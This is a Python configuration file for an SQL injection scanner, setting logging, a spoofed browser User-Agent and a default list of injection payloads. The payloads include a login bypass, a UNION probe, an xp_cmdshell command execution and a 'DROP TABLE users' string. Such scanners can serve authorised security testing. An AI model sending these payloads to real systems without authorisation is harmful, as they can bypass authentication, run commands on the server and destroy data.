# config.py
"""
Configuration settings for the SQL Injection Scanner
"""

# Logging configuration
LOG_FILE = "sqli_scan_results.log"
LOG_LEVEL = "INFO"  # Options: DEBUG, INFO, WARNING, ERROR, CRITICAL

# User-Agent configuration
USER_AGENT = "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"

# Payload settings
DEFAULT_PAYLOADS = [
    "' OR '1'='1'; --", 
    "' UNION SELECT NULL, NULL, NULL; --", 
    "' OR 1=1 --", 
    "'; EXEC xp_cmdshell('whoami'); --", 
    "' AND 'a'='a'; --", 
    "'; DROP TABLE users; --"
]
